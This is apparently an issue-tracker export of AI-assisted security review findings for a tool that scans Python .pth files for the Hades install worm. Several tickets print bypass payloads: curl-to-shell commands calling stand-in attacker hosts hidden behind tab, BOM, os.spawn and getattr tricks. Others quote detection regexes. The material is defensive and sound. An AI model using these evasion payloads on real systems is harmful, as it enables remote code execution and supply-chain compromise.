title: Hades .pth defense — multi-agent code review followups
description:
Multi-agent code review of branch `worktree-hades-pth-defense` (2026-06-10) found two P0 worm bypasses, one P1 fail-open, and assorted P2/P3 follow-ups.

**Reviewer fleet:** explorer (sonnet-4.6), correctness (opus-4.7), security (kimi-k2.6), architecture (gemini-3.1-pro), performance (glm-5.1), adversarial (qwen3.7-max), verifier (sonnet-4.6).

**Full report:** `.claude/HADES_REVIEW_REPORT.md` on the `worktree-hades-pth-defense` branch.

**Reproducer tests in tree:** `internal/pthscan/pthscan_test.go` has `TestVerifierClaim1_*` through `TestVerifierClaim4_*` — they currently `t.Logf` instead of asserting; after fixes land, promote them to `require.Equal` for regression coverage.

**Verdict:** do not merge until P0-1 and P0-2 are fixed. P1-1 (sdist fail-open) should land in the same PR if possible.

**Children:**
- 2 P0 bypass fixes (must-fix before merge)
- 1 P1 sdist fail-open
- 4 P2 defense-in-depth + correctness improvements
- 5 P3 nits / structural cleanup
close_reason: All 22 children closed; 6 bundles merged into worktree-hades-pth-defense. 3 follow-up beads filed (veto-x4w, veto-9ls, veto-l4t). Full test suite green except for two pre-existing npm-resolver-prescan tests unrelated to this work. Synthesis report archived at .claude/HADES_REVIEW_REPORT.md.

title: P0: pthscan misses `import\t` (tab-separated import) — worm bypass
description:
**File:** `internal/pthscan/pthscan.go:166`

**Bypass payload (bytes):**
```
import\tos; os.system('curl -sS https://attacker.tld/bun | sh')\n
```
(byte between `import` and `os` is `0x09`, not `0x20`)

**Why CPython executes it:** `site.py:213` uses `line.startswith(("import ", "import\t"))` — both space AND tab.

**Why pthscan misses it:** `executableLines()` only checks `"import "` / `"import("` / bare `"import"`. No `"import\t"` arm. Line never enters `scanPayloadSignals`; `os.system` never observed; verdict: SeverityNone.

**Verifier evidence:** `TestVerifierClaim1_TabSeparatorBypass/evil-pth-no-setup-suffix` returns `Severity: none, Signals: []` — full bypass. With `*-setup.pth` filename, payload still missed; only filename signal fires (`Severity: medium`).

**Recommended fix:**
```go
if strings.HasPrefix(trimmed, "import ") ||
   strings.HasPrefix(trimmed, "import\t") ||   // ← add
   strings.HasPrefix(trimmed, "import(") ||
   trimmed == "import" {
```

Defensively: consider also `\f`, `\v` (other whitespace CPython tokenizer accepts), or pivot to byte-class check after the `"import"` prefix.

**Reproducer test:** `go test ./internal/pthscan/ -run TestVerifierClaim1_TabSeparatorBypass -v` (already in tree; promote `t.Logf` to `require.Equal(t, pthscan.SeverityCritical, v.Severity)` after fix).

**Discovery chain:** found by kimi-k2.6 (security, wave-1), confirmed via empirical CPython execution proof by qwen3.7-max (adversarial), confirmed via Go test by sonnet-4.6 (verifier).
close_reason: Implemented in commit dd6d3c7: added isImportPrefix helper covering CPython site.py + tokenizer whitespace (space/tab/form-feed/vt) plus the `import(` and bare `import` shapes; promoted TestVerifierClaim1 to require assertions with the os.system payload + form-feed sub-case.

title: P3: ensure live-network tests (`live_real_test.go`) are gated under `-short`/build tag
description:
**Files:** `internal/pthscan/wheel/live_real_test.go`, `internal/gypscan/tarball/live_real_test.go`.

**Issue:** network-dependent tests — CI flakes risk if external infra (PyPI) hiccups. Verify they're properly gated under `-short` OR a `live` build tag so CI's default test run doesn't depend on outbound network.

**Action:** audit both files, confirm gating works. If not, add `t.Skip` under `-short` or move behind `//go:build live`.

**Discovery chain:** synthesis (opus-4.7) flagged as P3 hygiene.

title: P3: document `pthWheelScanTimeout` fail-open in `--strict` doc surface
description:
**File:** `cmd/veto/pth_wheel.go:78` (`pthWheelScanTimeout` context).

**Issue:** on timeout, the wheel prescan fails open (`break` out of the loop). This is intentional for UX, but it's an undocumented best-effort caveat. A `--strict` flag user reasonably expects fail-closed behavior.

**Action:** add to README / CLI help text: "wheel prescan is best-effort under timeout. `VETO_PTH_WHEEL_SCAN_TIMEOUT` raises the cap." Consider a `--strict-pth-prescan` flag that converts timeout-fail-open into timeout-fail-closed.

**Discovery chain:** synthesis (opus-4.7).
close_reason: Documented in README.md (item 3 of .pth detection section) and cmd/veto/main.go help text: 120s default timeout, fail-open on timeout, VETO_PTH_WHEEL_SCAN_TIMEOUT env var. Commit 40e4e8b.

title: P3: dead code in pthscan/wheel — RECORD-branch predicate + unused recordEntries
description:
**File:** `internal/pthscan/wheel/wheel.go:88` (and surrounding RECORD-parse block, ~lines 84-119).

**Issues:**
1. `strings.HasSuffix(base, ".dist-info/RECORD")` where `base := path.Base(name)` — `base` cannot contain `/`, so the first predicate is always false. Functionality holds because Go `&&` binds tighter than `||` so the right operand still parses RECORD via `name`.
2. The parsed `recordEntries` map is explicitly discarded at line 117 (`_ = recordEntries`) — the entire RECORD-parse block has no consumer today.

**Recommended action:** either:
- (a) fix the predicate to `strings.HasSuffix(name, ".dist-info/RECORD")` and drop the redundant `||` clause — keep the parse block if a downstream consumer is planned
- (b) delete the entire RECORD-parse block until something needs it

Also parenthesise alternatives for legibility regardless of which option.

**Discovery chain:** opus-4.7 (correctness, wave-1) flagged.

**Bonus P3 in same package:** `internal/scan/pth/pth.go:60` has a dead local `insideSitePackages := false` declared and silenced via `_ = insideSitePackages` at line 90. Real gating is `insideSitePackagesPath(path)` at line 86. Leftover refactor scaffolding. Delete the declaration and blank-assign while you're here.
close_reason: Implemented in commit ad21af1: deleted the entire dead RECORD-parse block (option b). The unsatisfiable predicate (base cannot contain '/'), unused recordEntries map, and dead bytes/encoding/csv imports are all gone. Comment in collectPthEntries documents the decision. Bundle F handles the bonus pth.go dead local.

title: P1: Python-PM target-dir flags (`pip install --target`) silently ignored
description:
**Files:** `cmd/veto/pth_preflight.go:123` (`pthScanRootsForInstall`) calling into `cmd/veto/gyp_target_dir.go:8-23` (`installTargetDirFlags`).

**Bug:** `installTargetDirFlags` map has entries ONLY for npm/pnpm/yarn/bun. For any Python PM (pip / pip3 / uv / uvx / pipx / poetry / pdm) the lookup returns no flags and `installTargetDir` falls through to `return cwd`.

**Repro:** `pip install --target /opt/x pkg` from `cwd=/tmp` → `pthScanRootsForInstall` returns `[/tmp]`. Actual install tree at `/opt/x/lib/python3.*/site-packages` is never walked. Pre-existing `.pth` worm under that target dir is invisible to BOTH the install hot-path preflight (`cmd/veto/main.go:473`) AND the Claude Code hook (`cmd/veto/hook.go:147-150`).

**Why this matters:** the docstring at `pth_preflight.go:107` ADVERTISES `pip install --target ./vendor` support. It doesn't work. The npm side has `TestRunClaudeCodeHook_BindingGypWormPrefixTargetDeniesEarly` for this exact bug. There is no Python analogue.

**Severity rationale:** P1 (not P0) because the bypass requires the user to invoke `pip install --target <dir>`, which is uncommon. But it's a hard-coded false negative — the defense is silently disabled. The advertised behavior is a lie.

**Recommended fix:** extend `installTargetDirFlags` with:
- pip / pip3: `--target` / `-t`, `--prefix`, `--root`
- uv (`uv pip`): same as pip
- poetry: `--directory` / `-C`
- pdm: `--project` / `-p`

Mirror the `gyp_target_dir_test.go` test cases for Python PMs. Add a `TestClaudeCodeHook_PthWormPipTargetDeniesEarly` test analogous to the npm one.

**Note:** synthesis report (`.claude/HADES_REVIEW_REPORT.md`) did NOT promote this to its P1 list. That's a synthesis-stage miss — it's a real P1 the correctness reviewer caught and the report buried. Filing here to make sure it lands.

**Discovery chain:** opus-4.7 (correctness, wave-1).
close_reason: Implemented in commit 0daf425: extended installTargetDirFlags with pip/pip3/uv entries for --target/-t/--prefix/--root, added 22 table-driven unit tests and TestRunClaudeCodeHook_PthWormPipTargetDeniesEarly, updated pthScanRootsForInstall docstring. Edge-case beads for --prefix/--root precision (veto-9ls) and poetry/pdm verification (veto-l4t) filed.

title: P1: pthscan spawn regex misses `os.spawn*` family (only catches `os.exec*`)
description:
**File:** `internal/pthscan/pthscan.go:206`

**Bypass:** spawn regex is `\b(?:subprocess|os\.system|os\.popen|popen|pty\.spawn|os\.exec[a-z]*)\b`. Covers `os.exec*` but NOT `os.spawn*` (spawnl, spawnle, spawnlp, spawnv, spawnve, spawnvp, spawnvpe).

**Concrete payload:**
```python
import os; os.spawnlp(os.P_WAIT, 'sh', 'sh', '-c', 'curl http://evil | sh')
```

**Why this matters:** the line still goes through `executableLines()` (matches `"import "` prefix) and runs `scanPayloadSignals`, but none of the 6 payload groups match. Result: SeverityMedium (executable-line only). Below the install-hot-path refusal threshold. Install proceeds.

**Severity rationale:** P1 — confirmed bypass, but requires attacker to use `os.spawn*` family which is less common than `os.system`/`subprocess`. Real Hades campaign uses `subprocess.Popen` which IS caught. But a variant author who reads kimi's regex doc would trivially evade.

**Recommended fix:** add `os\.spawn[a-z]*` to the spawn group, or broaden the existing arm to `os\.(?:exec|spawn)[a-z]*`.

**Discovery chain:** kimi-k2.6 (security, wave-1).
close_reason: Implemented in commit 869adf6: spawn regex now `os\.(?:exec|spawn)[a-z]*`; added TestInspectOsSpawnFamilyIsCritical.

title: P1: dynamic-exec regex misses `__import__ (` (whitespace before paren)
description:
**File:** `internal/pthscan/pthscan.go:211`

**Bypass:** dynamic-exec regex is `\b(?:exec\(|eval\(|compile\(|__import__\()`. Requires `(` immediately after the name with no whitespace. Python accepts whitespace between identifier and `(`.

**Concrete payload:**
```python
__import__ ('urllib.request').urlopen('http://evil')
```

**Why this matters:** same as veto-3w1.14 (spawn family) — line goes through `executableLines()`, gets SeverityMedium, install proceeds. Trivial 1-char bypass.

**Recommended fix:** allow optional whitespace: `\b(?:exec|eval|compile|__import__)\s*\(`.

**Note:** same fix would also re-protect against an `__import__\t(` tab variant.

**Discovery chain:** kimi-k2.6 (security, wave-1).
close_reason: Implemented in commit cbd2a20: regex now `\b(?:exec|eval|compile|__import__)\s*\(`; TestInspectDynamicExecWithWhitespaceBeforeParen covers zero-space, single-space, and tab variants.

title: P1: `getattr(__builtins__, 'exec')(...)` bypasses ALL payload groups
description:
**File:** `internal/pthscan/pthscan.go:195-237` (`payloadGroups`)

**Bypass:** a `.pth` line containing `getattr(__builtins__, 'exec')('import os; os.system("evil")')` achieves arbitrary code execution without matching ANY of the six payload-group regexes. `getattr` is not in network, spawn, dynamic-exec, deobfuscation, runtime-fetch, or marker groups. Doesn't match any allowlist either.

**Concrete payload:**
```python
import os; getattr(__builtins__, 'exec')('import os; os.system("evil")')
```

Result: SeverityMedium (executable-line only) — install proceeds.

**Why this matters:** this is the broader pattern — ANY way of retrieving a dangerous builtin via attribute access (`getattr`, `globals()`, `vars()`, `__builtins__['exec']`) bypasses the payload regexes. The veto-3w1.5 defense-in-depth content-body scan would partially mitigate by catching `getattr` itself as a suspicious token in a `.pth`.

**Recommended fix:** add `getattr` to the dynamic-exec group, OR add a catch-all for `__builtins__`/`builtins` access patterns that retrieve dangerous functions. Realistically: any `getattr(<thing>, 'exec'|'eval'|'compile'|'__import__'|'system'|'popen'|...)` should be flagged.

**Discovery chain:** kimi-k2.6 (security, wave-1). Verifier did NOT test this one (synthesis dropped it from the P1 list — another synthesis-stage miss).
close_reason: Implemented in commit 064af27: added getattr to dynamic-exec group, plus a new pth-payload-builtins-access group catching __builtins__/builtins references (attribute, subscript, or module). TestInspectBuiltinsAccessIsCritical covers five indirection shapes.

title: P1: `VETO_PTH_WHEEL_SCAN=off` is an attacker-settable kill switch
description:
**File:** `cmd/veto/pth_wheel.go:32-44` (`pthWheelScanMode`)

**Bypass:** a compromised agent/subprocess can `export VETO_PTH_WHEEL_SCAN=off` (or `0`, `false`, `no`) before invoking pip. The wheel prescan is then skipped entirely. Variable is not gated by signed config or by a config file's existence.

**Why this matters:** requires prior compromise of the agent/environment to set the env var, but it's a one-line off switch for a critical defense layer. Any agent already running malicious code can disable the next defense for itself.

**Severity rationale:** P1 — requires prior foothold, but the defense should be at least observable/loggable when disabled. Right now it's silent.

**Recommended fix (in order of strictness):**
1. (minimal) when prescan is disabled via env, log loudly at INFO/WARN and emit in the install summary so the user knows.
2. (better) require an explicit config file entry (`.veto/config.yaml` or similar) to disable, not just an env var.
3. (best) bind the disable to a flag that can be set per-invocation but is logged each time.

Don't accept `0`/`false`/`no` as silent disable values — only `off` should turn it off, and only loudly.

**Note:** the equivalent VETO_GYP_TARBALL_SCAN switch already exists and has the same property. If you address this one, address that one in the same PR for consistency.

**Discovery chain:** kimi-k2.6 (security, wave-1). Synthesis dropped from P1 list — third synthesis-stage miss.
close_reason: Implemented: only 'off' disables scan; WARN log + user-visible message emitted when disabled; legacy 0/false/no values no longer silently disable; unrecognised values get a WARN too. Commit 9b087a0.

title: P2: `hadesWorkflowExfilRe` curl+POST+secrets branch can't span YAML lines
description:
**File:** `internal/scan/agentsurface/agentsurface.go:156`

**Bug:** first alternative of `hadesWorkflowExfilRe` is `curl\s+[^\n]*-X\s*POST[^\n]*\$\{\{\s*secrets\.`. The `(?s)` flag only affects `.`, not character classes — `[^\n]*` still refuses to span newlines.

**Repro:** real GitHub Actions exfil workflows split `curl`, `-X POST`, the URL, and `${{ secrets.X }}` across multiple lines inside a `run: |` block. That common shape evades this branch entirely.

**Coverage:** the other three alternatives (`toJson(secrets)`, `webhook.site`, `webhooks?\.<domain>/`) still match a slice of patterns. So coverage degrades, not disappears.

**Side observation:** `(?s)` is currently dead in this regex — no literal `.` appears.

**Recommended fix:** either:
- replace `[^\n]*` with `.*` and rely on `(?s)` to make `.` match newlines
- decompose into two independent any-position checks: (curl -X POST anywhere in file) AND (`${{ secrets.` anywhere in file)

Add a multi-line workflow exfil fixture in `agentsurface_test.go` (test gap explorer flagged).

**Discovery chain:** opus-4.7 (correctness, wave-1).
close_reason: Fixed: replaced [^\n]* with .*? in first alternative of hadesWorkflowExfilRe; (?s) now active and meaningful. Multi-line YAML run-block exfil shape now detected. Commit 7c18a19 on fix/hades-bundle-e-agentsurface.

title: P2: `fileNameSetupRe` misses bare `setup.pth` (no leading `-`/`_`)
description:
**File:** `internal/pthscan/pthscan.go:220`

**Bug:** `fileNameSetupRe = (?i)[-_]setup\.pth$` requires `-` or `_` immediately before `setup`. A file named exactly `setup.pth` does not trigger the filename signal.

**Repro:**
```go
pthscan.Inspect(Input{PthContent: []byte("some/path\n"), FileName: "setup.pth"})  // → SeverityNone
pthscan.Inspect(Input{PthContent: []byte("some/path\n"), FileName: "x-setup.pth"}) // → SeverityMedium
```
One-character rename defeats the structural backstop.

**Why this matters:** the filename signal exists as a backstop for cases where the payload itself doesn't match (e.g. the BOM + tab + multi-line CR cases). When the body fails to flag, the filename catches `*-setup.pth` shape — except a single-rename worm with bare `setup.pth` slips through both.

**Recommended fix:** `(?i)(^|[-_])setup\.pth$`. Add `TestInspectBareSetupFilenameAloneIsMedium` test.

**Discovery chain:** opus-4.7 (correctness, wave-1).
close_reason: Implemented in commit b7d5940: fileNameSetupRe widened to (^|[-_])setup.pth$; TestInspectBareSetupFilenameAloneIsMedium added.

title: P0: pthscan does not strip UTF-8 BOM — worm bypass
description:
**File:** `internal/pthscan/pthscan.go:127` (`content := string(in.PthContent)`) and `:166` (the `HasPrefix("import ")` check).

**Bypass payload (bytes):**
```
\xEF\xBB\xBFimport os; os.system('curl -sS https://attacker.tld/bun | sh')\n
```

**Why CPython executes it:** `site.py` opens `.pth` in binary mode, strips leading `codecs.BOM_UTF8`, decodes UTF-8, then runs `splitlines()`. BOM is invisible to the line scanner. Verified: `b'\xef\xbb\xbfimport os; ...'.decode("utf-8-sig").splitlines()[0].startswith(("import ", "import\t"))` returns `True`.

**Why pthscan misses it:** `Inspect` does `string(in.PthContent)` with no BOM strip. First line becomes `"\xEF\xBB\xBFimport os; ..."`. `TrimLeft(line, " \t")` only strips ASCII spaces/tabs. `trimmed` still starts with BOM bytes. `HasPrefix(trimmed, "import ")` checks against `0xEF` (not `i`/`0x69`) — false. Line treated as inert path entry; payload scanning never runs.

**Verifier evidence:** `TestVerifierClaim3_UTF8BOMBypass` returns `Severity: none, Signals: []` — full bypass.

**Recommended fix:**
```go
// In Inspect(), before `content := string(in.PthContent)`:
raw := in.PthContent
if bytes.HasPrefix(raw, []byte{0xEF, 0xBB, 0xBF}) {
    raw = raw[3:]
}
content := string(raw)
```

**Belt-and-braces:** also reject UTF-16 BOMs (`FF FE`, `FE FF`) by returning Critical "unscannable encoding". CPython won't execute UTF-16 `.pth` anyway, but gives attacker no cover.

**Reproducer test:** `go test ./internal/pthscan/ -run TestVerifierClaim3_UTF8BOMBypass -v` (in tree; promote to assertion after fix).

**Discovery chain:** kimi-k2.6 (security, wave-1) flagged "UTF-8 BOM" as category concern but no proof. qwen3.7-max (adversarial) constructed empirical CPython execution + pthscan test proving the bypass. sonnet-4.6 (verifier) re-confirmed via independent Go test.

**Operational note:** this is the finding that paid for model-lineage diversity in this review. claude-lineage reviewers didn't construct the proof; qwen did.
close_reason: Implemented in commit 6a7bccb: bytes.TrimPrefix(utf8BOM) before string conversion in Inspect(); UTF-16 BOMs (LE+BE) return SeverityCritical with new pth-unscannable-encoding signal. Promoted TestVerifierClaim3 to assertions; added TestInspectUTF16BOMIsCritical.

title: P2: TOCTOU between wheel scan (pip download) and actual pip install
description:
**File:** `cmd/veto/pth_wheel.go:155-195`

**Threat:** the index can serve different wheels for the same name@version between scan and install.

**Attack flow:** scan downloads wheel via `pip download`, inspects, then a separate `pip install` runs. An adversary controlling the index (or leveraging a race in package publishing) could serve a clean wheel for scan and a malicious wheel for install. Platform-specific wheel selection can also differ between two pip invocations.

**Confidence:** structural gap confirmed by kimi's source-trace.

**Recommended mitigation:**
- (best) cache the verified wheel hash from scan and enforce it during install
- (cheap) use `pip install --no-index --find-links <scanned-dir>` to pin install to the wheels veto already verified
- (also cheap) verify wheel digests against PyPI's reported hashes before AND after scan

**Severity:** P2 because the attack requires the adversary to control or race the index, which is plausible (PyPI is rate-limited but not authenticated for downloads) but unusual.

**Discovery chain:** kimi-k2.6 (security, wave-1).
close_reason: Partial mitigation implemented: SHA-256 of each scanned wheel computed via hashWheelFile(), stored in wheelFinding.whlSHA256, logged at INFO per scan. Hash included in refusal output. Full enforcement (pip install --require-hashes / --find-links) requires main.go changes; follow-up filed as veto-x4w. Commit 08eed90.

title: P3: zip bomb DoS — no decompression ratio guard in wheel scanner
description:
**File:** `internal/pthscan/wheel/wheel.go:55-70`

**Threat:** denial-of-service, not worm bypass.

**Detail:** wheel scanner limits total entries (`maxWheelEntries = 100_000`) and per-file bytes (`maxPthBytes = 256 * 1024`) but has no decompression ratio guard. A zip bomb (small compressed archive that expands to GB) could cause `io.ReadAll` to consume memory before hitting the `LimitReader` cap.

**Severity:** P3. Real impact: a malicious wheel hosted on PyPI could DoS veto users. The user would notice (memory spike, slow install) but the install would still complete fail-open per current design.

**Recommended fix:** wrap entry reads in `io.LimitReader` before `io.ReadAll`, OR cap total decompressed bytes per zip (e.g. 256 MB).

**Discovery chain:** kimi-k2.6 (security, wave-1).
close_reason: Implemented in commit 0cb50cf: added maxWheelDecompressedBytes=256MB constant and totalDecompressed accumulator in collectPthEntries. TestInspectZipBombRejected verifies a 1025-entry zip bomb (263MB decompressed, ~200KB on disk) is rejected with error containing 'decompressed size exceeds limit'.

title: P3: wheel scanner should explicitly reject zip symlink entries
description:
**File:** `internal/pthscan/wheel/wheel.go:55-60`

**Issue:** currently the wheel scanner reads `.pth` files in-memory and never extracts to disk, so symlink entries are not directly exploitable. But if extraction is ever added (e.g. for richer content analysis), a malicious wheel with a symlink entry pointing outside the zip could affect that path.

**Recommendation:** defense-in-depth — add explicit rejection of zip entries with `ModeType & os.ModeSymlink != 0` in `collectPthEntries`. Latent risk only; document the choice if you skip.

**Discovery chain:** kimi-k2.6 (security, wave-1).
close_reason: Implemented in commit 58761e2: added f.Mode()&os.ModeSymlink!=0 guard in collectPthEntries with explanatory comment. TestInspectSkipsSymlinkEntries verifies symlink entries in purelib paths are silently skipped.

title: P1: sdist-only wheel prescan fails open — worm lands without inspection
description:
**File:** `cmd/veto/pth_wheel.go:85–93` (call site) and `:165–200` (`downloadAndInspectWheel`).

**Why this is real:** `downloadAndInspectWheel` shells out to `pip download --no-deps --only-binary :all:`. For sdist-only packages, `pip download` returns success with no `.whl`, function returns `fmt.Errorf("pip download %s produced no wheel ...")`. Caller (line 88-89):
```go
if err != nil {
    logger.Warn().Err(err).Str("spec", tgt.spec()).Msg(".pth wheel preflight: fetch/inspect failed; skipping this package")
    continue
}
```
Fail-open. Worm proceeds to `pip install`, which builds sdist, drops `.pth` into venv, detonates on next `python` startup. Existing-tree scan catches it only on *next* install, after damage done.

**Recommended fix:** distinguish "no wheel exists" from "transient fetch error" and fail-closed on the former. Either:
- (a) after failed `--only-binary :all:` download, retry with `pip index versions <name>` (or `pip download --no-deps --no-binary :all:`) to verify whether sdists exist; if so, refuse with clear "sdist-only package; veto refuses to fall back to build-time inspection" message.
- (b) cheaper: parse `pip download` stderr for canonical "Could not find a version that satisfies the requirement" / "No matching distribution found", treat both that and `produced no wheel` as fail-closed.

**Severity rationale:** P1 (not P0) because attacker must ship sdist-only — less likely shape than wheel-bundled `.pth`. Real Hades worm needs `.data/purelib/` path so it ships wheels. But a sdist-capable Hades variant becomes the primary install vector once you assume sdist-capable adversaries.

**Reproducer:** no automated test exists. Build by hand: publish local sdist with malicious `setup.py` writing `.pth` at build time, point pip at it, observe veto's pth-preflight allowing the install.

**Discovery chain:** qwen3.7-max (adversarial) flagged from source-trace; sonnet-4.6 (verifier) confirmed the fail-open path by reading runGate ordering. No live pip in environment so no E2E test — source-traced only.

title: P2: pthscan line splitter only recognizes `\n` — multi-line `\r`-only files defeat gate
description:
**File:** `internal/pthscan/pthscan.go:154` (`executableLines` loop).

**Issue:** the line splitter only breaks on `'\n'`. CPython's `site.py` uses `str.splitlines()` which breaks on `\r`, `\n`, `\r\n`, `\u0085`, `\u2028`, `\u2029`.

**Single-line CR-only case (NOT a bypass):** `TestVerifierClaim2_CROnlyLineEndings` returned `Severity: critical`, `Signals: [pth-payload-spawn]` — caught via implicit end-of-buffer terminator + `TrimSuffix("\r")`. qwen claimed P0; verifier refuted P0 status.

**Multi-line CR-only case (still a bypass):** e.g. `"# comment\rimport os; os.system('x')\r"` — collapses into one logical line whose `TrimLeft` lands on `#`, marking it inert. CPython sees 2 lines and executes line 2. Untested but follows directly from the splitter logic.

**Recommended fix:** extend the splitter to break on the same set CPython does. Simplest:
```go
lines := strings.FieldsFunc(content, func(r rune) bool {
    return r == '\n' || r == '\r' || r == '\u0085' || r == '\u2028' || r == '\u2029'
})
```
or write a small `isCPythonLineTerm` predicate.

**Note:** this is the same shape of issue as P0-1 (`import\t`) and P0-2 (BOM). Root cause framing from qwen: *pthscan reimplements Python's line parsing instead of matching CPython's exact algorithm.* See P2 epic on defense-in-depth content-body scan (`veto-3w1.5`).

**Discovery chain:** opus-4.7 (correctness, wave-1) flagged P2 with caveat. qwen3.7-max escalated to P0 incorrectly. sonnet-4.6 (verifier) refuted the P0 escalation but the multi-line case remains.

description:
**File:** `internal/pthscan/wheel/wheel.go:144` (`isPthInWheel`).

**Issue:** wheel scanner only matches `.data/purelib/` and `.data/platlib/`. Adversarial (qwen) flagged `.data/scripts/`, `.data/headers/`, `.data/data/` as missing.

title: P2: Hades intel source uses exact-string version match — PEP 440 variants slip past
description:
**Files:** `internal/intel/sources/hades/hades.go` + `internal/intel/normalize.go:38` (`NormalizeVersion` for `EcosystemPyPI` falls through to `default: return version`).

**Issue:** hades.go stores `{name: "ensmallen", version: "0.8.6"}`. Lookup for `ensmallen==0.8.6.post1` misses `byVersion[{PyPI, "ensmallen", "0.8.6.post1"}]` (different string). Also misses `byName` sweep (`r.Version != ""` AND `r.Range == nil` — neither switch case fires). Result: not flagged.

**PyPI publishing reality:**
- `0.8.6.post1` IS publishable on PyPI — realistic attack vector
- `0.8.6+local` CANNOT be published (PyPI rejects local labels)
- `0.8.6rc1` sorts BEFORE `0.8.6` (pre-release of unreleased version)

**Severity rationale:** P2 because:
- hades static list is explicitly a stopgap (per design spec)
- pthscan content heuristic catches the worm regardless of version string
- bypassed layer is belt-and-braces only

**Recommended fix:** either (a) store hades entries as version ranges (`introduced: "0.8.6", last_affected: "0.8.6"`) with range-aware lookup, OR (b) add a PyPI normalization case to `NormalizeVersion` that strips `.post0` and normalizes to PEP 440 canonical form. Option (a) is structurally cleaner.

**Discovery chain:** qwen3.7-max (adversarial); sonnet-4.6 (verifier) confirmed via source-trace.

Strip # comments before matching (preserve offsets). Table-driven tests + gated live_real_test against real wheels (setuptools etc) asserting none. Spec sec 1.
